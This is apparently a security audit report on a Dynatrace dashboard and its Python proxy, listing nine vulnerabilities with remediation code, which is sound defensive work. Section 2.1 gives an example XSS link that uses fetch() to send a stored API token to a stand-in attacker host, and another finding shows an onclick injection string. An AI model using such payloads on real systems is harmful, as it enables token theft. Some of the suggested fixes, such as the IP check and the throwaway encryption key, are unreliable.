# Security Audit Report - Dynatrace Dashboard

**Date:** 2025-11-23
**Repository:** singleuse-dashboard
**Auditor:** Security Analysis

---

## Executive Summary

This security audit identified **9 significant vulnerabilities** in the Dynatrace dashboard application:
- **4 Critical** (require immediate attention)
- **5 Medium** (should be addressed)

The main concerns are **XSS vulnerabilities**, **insecure credential storage**, and **lack of authentication** on the proxy server.

---

## 🔴 Critical Vulnerabilities

### 1. Insecure Credential Storage

**File:** `dashboard.html`
**Lines:** 1240-1242, 1042-1050
**Severity:** CRITICAL

**Description:**
Dynatrace API tokens are stored in plain text in browser `localStorage`:

```javascript
config = { tenantUrl, apiToken, proxyUrl, proxyApiKey, deployMode, enableLogging };
localStorage.setItem(CONFIG_KEY, JSON.stringify(config));
```

**Risk:**
- Any XSS attack can steal the API token
- Browser extensions can read localStorage
- Tokens persist indefinitely in browser storage
- No encryption or obfuscation

**Impact:**
- Full unauthorized access to Dynatrace tenant
- Data exfiltration
- Resource abuse (DPU consumption)

**Recommendation:**
```javascript
// Option 1: Use sessionStorage (expires when browser closes)
sessionStorage.setItem(CONFIG_KEY, JSON.stringify(config));

// Option 2: Encrypt sensitive data before storing
async function encryptToken(token) {
    const encoder = new TextEncoder();
    const data = encoder.encode(token);
    const key = await crypto.subtle.generateKey(
        { name: "AES-GCM", length: 256 },
        true,
        ["encrypt", "decrypt"]
    );
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt(
        { name: "AES-GCM", iv: iv },
        key,
        data
    );
    return { encrypted: Array.from(new Uint8Array(encrypted)), iv: Array.from(iv) };
}

// Option 3: Move credentials to backend (BEST)
// Never store API tokens in frontend
```

---

### 2. Cross-Site Scripting (XSS) - Multiple Vectors

**File:** `dashboard.html`
**Severity:** CRITICAL

#### 2.1 Markdown Rendering XSS
**Lines:** 1829, 1359-1384

```javascript
// VULNERABLE CODE:
function renderMarkdown(text) {
    let html = text;
    html = html.replace(/`([^`]+)`/g, '<code>$1</code>');
    html = html.replace(/\[([^\]]+)\]\(([^\)]+)\)/g, '<a href="$2" target="_blank">$1</a>');
    return html;
}

td.innerHTML = markdownRendered; // Line 1829
```

**Exploit Example:**
```
Input: [Click me](javascript:fetch('https://attacker.com/steal?token='+localStorage.getItem('dynatrace_config')))
Output: <a href="javascript:..." target="_blank">Click me</a>
```

**Recommendation:**
```javascript
function renderMarkdown(text) {
    if (!text || typeof text !== 'string') return text;

    // 1. HTML encode first
    text = text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');

    // 2. Then apply markdown (now safe)
    let html = text;
    html = html.replace(/`([^`]+)`/g, '<code>$1</code>');
    html = html.replace(/\*\*([^\*]+)\*\*/g, '<strong>$1</strong>');

    // 3. Validate URLs before creating links
    html = html.replace(/\[([^\]]+)\]\(([^\)]+)\)/g, (match, text, url) => {
        // Only allow http/https URLs
        if (url.match(/^https?:\/\//)) {
            return `<a href="${url}" target="_blank" rel="noopener noreferrer">${text}</a>`;
        }
        return text; // Ignore invalid URLs
    });

    return html;
}

// BETTER: Use DOMPurify library
// <script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>
function renderMarkdown(text) {
    const html = simpleMarkdownToHtml(text);
    return DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ['strong', 'em', 'code', 'a'],
        ALLOWED_ATTR: ['href', 'target', 'rel']
    });
}
```

#### 2.2 URL Injection in Hexagons
**Line:** 1658

```javascript
// VULNERABLE:
container.innerHTML = `
    <div class="hexagon ${hasLink ? 'clickable' : ''}"
         ${hasLink ? `onclick="window.open('${link}', '_blank')"` : ''}>
`;
```

**Exploit Example:**
```
link = "'); alert('XSS'); ('"
Result: onclick="window.open(''); alert('XSS'); ('', '_blank')"
```

**Recommendation:**
```javascript
// Option 1: Use setAttribute (automatic escaping)
const hexDiv = document.createElement('div');
hexDiv.className = `hexagon ${hasLink ? 'clickable' : ''}`;
if (hasLink && link.match(/^https?:\/\//)) {
    hexDiv.onclick = () => window.open(link, '_blank', 'noopener,noreferrer');
}

// Option 2: Validate and escape
function escapeHtml(str) {
    return str.replace(/[&<>"']/g, (m) => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;',
        '"': '&quot;', "'": '&#x27;'
    })[m]);
}

const escapedLink = escapeHtml(link);
```

#### 2.3 Dashboard Title Injection
**Lines:** 1247, 2094

```javascript
// VULNERABLE:
document.querySelector('.header h1').innerHTML = `
    <img src="..." alt="Dynatrace" ...>
    ${dashboardTitle}
    <span class="status-indicator" id="proxyStatus"></span>
`;
```

**Recommendation:**
```javascript
// Use textContent for user input
const h1 = document.querySelector('.header h1');
h1.innerHTML = '<img src="..." alt="Dynatrace" ...>';
const titleText = document.createTextNode(dashboardTitle);
h1.appendChild(titleText);
const statusSpan = document.createElement('span');
statusSpan.className = 'status-indicator';
statusSpan.id = 'proxyStatus';
h1.appendChild(statusSpan);
```

---

### 3. Open CORS Policy

**File:** `proxy_server.py`
**Line:** 215
**Severity:** CRITICAL

```python
def send_cors_headers(self):
    self.send_header('Access-Control-Allow-Origin', '*')  # VULNERABLE
    self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
```

**Risk:**
- Any website can send requests through your proxy
- Enables CSRF attacks
- Malicious sites can abuse your Dynatrace tenant
- No origin validation

**Recommendation:**
```python
ALLOWED_ORIGINS = [
    'http://localhost:8081',
    'http://127.0.0.1:8081',
    # Add your production domains
]

def send_cors_headers(self, origin=None):
    if origin in ALLOWED_ORIGINS:
        self.send_header('Access-Control-Allow-Origin', origin)
    else:
        self.send_header('Access-Control-Allow-Origin', ALLOWED_ORIGINS[0])

    self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-API-Key')
    self.send_header('Access-Control-Allow-Credentials', 'true')

def do_POST(self):
    origin = self.headers.get('Origin')
    if origin not in ALLOWED_ORIGINS:
        self.send_error(403, "Origin not allowed")
        return
    # ... rest of code
```

---

### 4. No Authentication on Proxy

**File:** `proxy_server.py`
**Severity:** CRITICAL

**Description:**
The proxy server has no authentication mechanism. Anyone who can reach `http://localhost:8081` can:
- Execute arbitrary DQL queries
- Access all data in your Dynatrace tenant
- Consume DPU resources
- Perform reconnaissance

**Risk:**
- If accidentally exposed (port forwarding, Docker, cloud deployment)
- Local malware can abuse the proxy
- Other users on the same machine

**Recommendation:**
```python
import secrets
import hashlib

# Generate API key once and store securely
API_KEY = os.environ.get('PROXY_API_KEY') or secrets.token_urlsafe(32)

def verify_api_key(self):
    """Verify X-API-Key header"""
    provided_key = self.headers.get('X-API-Key', '')
    expected_key = API_KEY

    # Constant-time comparison to prevent timing attacks
    return secrets.compare_digest(provided_key, expected_key)

def do_POST(self):
    if self.path != '/api':
        self.send_error(404)
        return

    # Check authentication
    if not self.verify_api_key():
        self.send_response(401)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({
            'error': 'Unauthorized',
            'message': 'Valid X-API-Key header required'
        }).encode('utf-8'))
        return

    # ... rest of code
```

Then update `dashboard.html`:
```javascript
const response = await fetch(apiEndpoint, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-API-Key': 'your-secure-key-here'  // Or prompt user
    },
    body: JSON.stringify({...})
});
```

---

## 🟡 Medium Severity Issues

### 5. Server-Side Request Forgery (SSRF)

**File:** `proxy_server.py`
**Lines:** 79-83
**Severity:** MEDIUM

```python
# No URL validation
dynatrace_url = request_data.get('url')
dynatrace_url = dynatrace_url.rstrip('/')
api_url = f"{dynatrace_url}/platform/storage/query/v1/query:execute"
```

**Risk:**
Attacker can make the proxy send requests to:
- Internal services (cloud metadata: `http://169.254.169.254`)
- Private network resources
- Other Dynatrace tenants

**Recommendation:**
```python
from urllib.parse import urlparse
import ipaddress

ALLOWED_DOMAINS = [
    '.apps.dynatrace.com',
    '.live.dynatrace.com',
    '.sprint.dynatracelabs.com'
]

def validate_dynatrace_url(url):
    """Validate that URL is a legitimate Dynatrace tenant"""
    try:
        parsed = urlparse(url)

        # Must use HTTPS
        if parsed.scheme != 'https':
            raise ValueError("Only HTTPS URLs allowed")

        # Check domain whitelist
        hostname = parsed.hostname
        if not any(hostname.endswith(domain) for domain in ALLOWED_DOMAINS):
            raise ValueError(f"Domain {hostname} not in allowed list")

        # Prevent IP addresses
        try:
            ipaddress.ip_address(hostname)
            raise ValueError("IP addresses not allowed")
        except ValueError:
            pass  # Not an IP, good

        # No private IPs
        try:
            ip = socket.gethostbyname(hostname)
            if ipaddress.ip_address(ip).is_private:
                raise ValueError("Private IP addresses not allowed")
        except:
            pass

        return True
    except Exception as e:
        raise ValueError(f"Invalid Dynatrace URL: {e}")

# In do_POST:
dynatrace_url = request_data.get('url')
validate_dynatrace_url(dynatrace_url)  # Raises exception if invalid
```

---

### 6. Path Traversal Vulnerability

**File:** `proxy_server.py`
**Lines:** 29-48
**Severity:** MEDIUM

```python
if self.path == '/' or self.path == '/dashboard.html':
    script_dir = os.path.dirname(os.path.abspath(__file__))
    html_path = os.path.join(script_dir, 'dashboard.html')  # Hardcoded, but...
```

**Current Status:** Low risk (path is hardcoded), but can become vulnerable if refactored.

**Recommendation:**
```python
import os.path

ALLOWED_FILES = {
    '/': 'dashboard.html',
    '/dashboard.html': 'dashboard.html',
    '/index.html': 'dashboard.html'
}

def do_GET(self):
    if self.path == '/health':
        # ... health check
        return

    # Whitelist approach
    if self.path not in ALLOWED_FILES:
        self.send_error(404, "File not found")
        return

    filename = ALLOWED_FILES[self.path]
    script_dir = os.path.dirname(os.path.abspath(__file__))
    html_path = os.path.join(script_dir, filename)

    # Additional safety check
    html_path = os.path.abspath(html_path)
    if not html_path.startswith(script_dir):
        self.send_error(403, "Access denied")
        return

    try:
        with open(html_path, 'r', encoding='utf-8') as f:
            content = f.read()
        # ... send response
```

---

### 7. Information Disclosure - Detailed Error Messages

**File:** `proxy_server.py`
**Lines:** 167-188
**Severity:** MEDIUM

```python
except urllib.error.HTTPError as e:
    error_body = e.read().decode('utf-8') if e.fp else str(e)
    self.wfile.write(json.dumps({
        'error': f'Dynatrace API error: {e.code}',
        'message': error_body  # Exposes internal details
    }).encode('utf-8'))
```

**Risk:**
- Reveals Dynatrace API structure
- Exposes internal configuration
- Helps attackers understand the system

**Recommendation:**
```python
# Define generic error messages
ERROR_MESSAGES = {
    400: "Invalid request parameters",
    401: "Authentication failed",
    403: "Access denied",
    404: "Resource not found",
    429: "Rate limit exceeded",
    500: "Internal server error"
}

except urllib.error.HTTPError as e:
    error_body = e.read().decode('utf-8') if e.fp else str(e)

    # Log detailed error server-side
    print(f"[ERROR] Dynatrace API returned {e.code}: {error_body}")

    # Return generic message to client
    self.send_response(e.code)
    self.send_cors_headers()
    self.send_header('Content-Type', 'application/json')
    self.end_headers()

    generic_message = ERROR_MESSAGES.get(e.code, "Request failed")
    self.wfile.write(json.dumps({
        'error': generic_message,
        'code': e.code
    }).encode('utf-8'))
```

---

### 8. Token Exposure in Logs

**File:** `proxy_server.py`
**Line:** 115
**Severity:** MEDIUM

```python
if enable_logging:
    print(f"  Authorization: Bearer {api_token[:20]}...{api_token[-10:]}")
```

**Risk:**
- Partial token exposure aids brute force attacks
- Logs may be stored insecurely
- Log aggregation systems may be compromised

**Recommendation:**
```python
if enable_logging:
    # Show only token prefix for identification
    token_prefix = api_token[:8] if len(api_token) > 8 else "***"
    print(f"  Authorization: Bearer {token_prefix}...***")

    # Better: Don't log tokens at all
    print(f"  Authorization: Bearer [REDACTED]")
```

---

### 9. No Rate Limiting

**File:** `proxy_server.py`
**Severity:** MEDIUM

**Description:**
The proxy has no rate limiting, allowing:
- DDoS attacks on Dynatrace tenant
- Excessive DPU consumption
- Resource exhaustion

**Recommendation:**
```python
from collections import defaultdict
from time import time
import threading

class RateLimiter:
    def __init__(self, max_requests=100, window_seconds=60):
        self.max_requests = max_requests
        self.window_seconds = window_seconds
        self.requests = defaultdict(list)
        self.lock = threading.Lock()

    def is_allowed(self, client_ip):
        with self.lock:
            now = time()
            # Clean old requests
            self.requests[client_ip] = [
                req_time for req_time in self.requests[client_ip]
                if now - req_time < self.window_seconds
            ]

            # Check limit
            if len(self.requests[client_ip]) >= self.max_requests:
                return False

            # Add new request
            self.requests[client_ip].append(now)
            return True

# In CORSProxyHandler:
rate_limiter = RateLimiter(max_requests=100, window_seconds=60)

def do_POST(self):
    client_ip = self.client_address[0]

    if not rate_limiter.is_allowed(client_ip):
        self.send_response(429)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Retry-After', '60')
        self.end_headers()
        self.wfile.write(json.dumps({
            'error': 'Rate limit exceeded',
            'message': 'Too many requests. Please try again later.'
        }).encode('utf-8'))
        return

    # ... rest of code
```

---

## 📋 Security Checklist

### Immediate Actions (Critical)
- [ ] Implement authentication on proxy server
- [ ] Restrict CORS to specific origins
- [ ] Sanitize all HTML output (use DOMPurify)
- [ ] Move API tokens to backend or encrypt in localStorage
- [ ] Validate and whitelist Dynatrace tenant URLs

### Short-term Improvements (High Priority)
- [ ] Add rate limiting to proxy
- [ ] Implement HTTPS for proxy server
- [ ] Add Content Security Policy (CSP) headers
- [ ] Validate all URLs before creating links
- [ ] Use textContent instead of innerHTML for user input
- [ ] Implement secure session management

### Long-term Improvements
- [ ] Move to proper backend architecture (Node.js/Express or Python/Flask)
- [ ] Implement OAuth2 authentication
- [ ] Add request signing for API calls
- [ ] Implement comprehensive logging with security events
- [ ] Add automated security scanning to CI/CD
- [ ] Conduct penetration testing

---

## 🛡️ Additional Security Recommendations

### Content Security Policy (CSP)

Add to `dashboard.html` (line 6):
```html
<meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;
    style-src 'self' 'unsafe-inline';
    img-src 'self' https://companieslogo.com https://dt-cdn.net data:;
    connect-src 'self' http://localhost:8081;
    font-src 'self';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
">
```

### HTTPS for Proxy

Replace Python's HTTPServer with a production WSGI server:
```bash
pip install gunicorn

# Run with HTTPS
gunicorn --certfile=cert.pem --keyfile=key.pem --bind 0.0.0.0:8443 proxy_server:app
```

### Input Validation Library

Add to `dashboard.html`:
```html
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>
```

### Environment Variables

Never hardcode secrets. Use environment variables:
```python
import os
from dotenv import load_dotenv

load_dotenv()

API_KEY = os.environ.get('PROXY_API_KEY')
ALLOWED_ORIGINS = os.environ.get('ALLOWED_ORIGINS', '').split(',')
```

---

## 📊 Risk Assessment Summary

| Vulnerability | Severity | Exploitability | Impact | Priority |
|--------------|----------|----------------|--------|----------|
| Credential Storage | Critical | Easy | High | P0 |
| XSS Attacks | Critical | Easy | High | P0 |
| Open CORS | Critical | Easy | High | P0 |
| No Authentication | Critical | Easy | High | P0 |
| SSRF | Medium | Medium | Medium | P1 |
| Path Traversal | Medium | Hard | Medium | P2 |
| Info Disclosure | Medium | Easy | Low | P2 |
| Token in Logs | Medium | Easy | Low | P2 |
| No Rate Limiting | Medium | Easy | Medium | P1 |

---

## 📚 References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)

---

## 📞 Contact

For questions about this security report, please contact the security team.

**Report Date:** 2025-11-23
**Next Review:** Recommend immediate remediation and re-assessment within 30 days
